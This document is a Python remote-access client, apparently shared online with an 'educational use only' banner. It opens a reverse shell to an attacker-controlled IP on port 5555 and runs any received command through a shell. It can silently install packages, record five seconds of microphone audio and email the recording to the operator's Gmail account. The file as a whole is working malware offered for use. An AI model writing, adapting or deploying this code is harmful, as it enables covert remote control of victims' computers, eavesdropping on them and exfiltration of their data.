import socket
import os
import subprocess
import serial


#######################################################################################

# This script binds shell in port 5555 and connects to the server (attacker - LInux)  #
# in RAClient's Script installs dependecies for GRABBING the screen                #
# and VOICE and sending them using sendEmail to your gmail account.                   #
# YOU have to change the host(attacker) IP
# the email & the password (sendEmail needs those data),           		      #
# if any problem with SendEmail seek POP3 setup in GMail                              #
										      #
# THIS IS FOR EDUCATIONAL USE ONLY, ANY OTHER USE IS ILLEGAL 			      #
										      #
										      #
										      #
#--------------- WROTE BY CyberHcks - CONTACT cyberhcks@gmail.com --------------------#

#######################################################################################




os.system("clear")
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPV4 - TCP
puerto=5555
host="x.x.x.x" 

try:
    sock.connect((host,puerto))
except Exception as mgs:
    print("[-] An error Occured: ",msg)
    
while True:    
    #msg=socket.gethostname()
    mensaje=sock.recv(1024)    

    if mensaje.decode("utf-8") == "quit":
        mens="Liberando ordenador..."
        sock.send(mens.encode("utf-8"))
        sock.close()
        mens="Ordenador liberado "
        sock.send(mens.encode("utf-8"))    

    if mensaje.decode("utf-8") == "install":
        try:
            
            msg1="installing depencencies for rec ..."
            sock.send(msg1.encode("utf-8"))
            msg2="[+] Installed depencencies for rec! "
            os.system("apt-get -y install sox ")
            sock.send(msg2.encode("utf-8"))
            msg1="[+] SendEmail Installed! "
            os.system("apt-get -y install sendmail ")
            sock.send(msg1.encode("utf-8"))
            msg1="Installing dependencies for SendEmail..."
            sock.send(msg1.encode("utf-8"))
            os.system("apt-get -y install libnet-ssleay-perl ")
            os.system("apt-get -y install libio-socket-ssl-perl ")          
            msg1="[+] Dependencies for SendEmail installed! "        
            sock.send(msg1.encode("utf-8"))
            
        except Exception as error:
            
            print("[-] Error en proceso de intalacion de depencendias: ", error)
            
    if (mensaje[:2].decode("utf-8") == "cd"):
        os.chdir(mensaje[3:].decode("utf-8"))
            
        
    if mensaje[:3].decode("utf-8") == "rec":
     
        os.system("timeout 5 rec -r 8000 -c 1 1.wav")
        #os.system("proc = ps -aux | grep rec | awk 'NR==1{print $2}' ")
        #os.system("kill $proc")
        os.system("sendEmail -o tls=yes -f YOUR-EMAIL@gmail.com -t YOUR-EMAIL@gmail.com -s smtp.gmail.com:587 -xu YOUR-EMAIL@gmail.com -xp YOUR-PASSWAOR -u RECORD.WAV -m TRACK -a 1.wav" )
            
    cmd=subprocess.Popen(mensaje[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    print(mensaje.decode("utf-8"))
    cmdT_bites=cmd.stdout.read() + cmd.stderr.read() #Enviamos los errores al atacante
    cmdT_str=str(cmdT_bites,"utf-8") #COnvertimos de bites a str
    cmdT_str_concat=str.encode(cmdT_str+str(socket.gethostname())+"//"+ str(os.getcwd()) + "> ", "utf-8") #UNa vez que todo sea string convertimos utf-8
    
    sock.send(cmdT_str_concat)



sock.close()

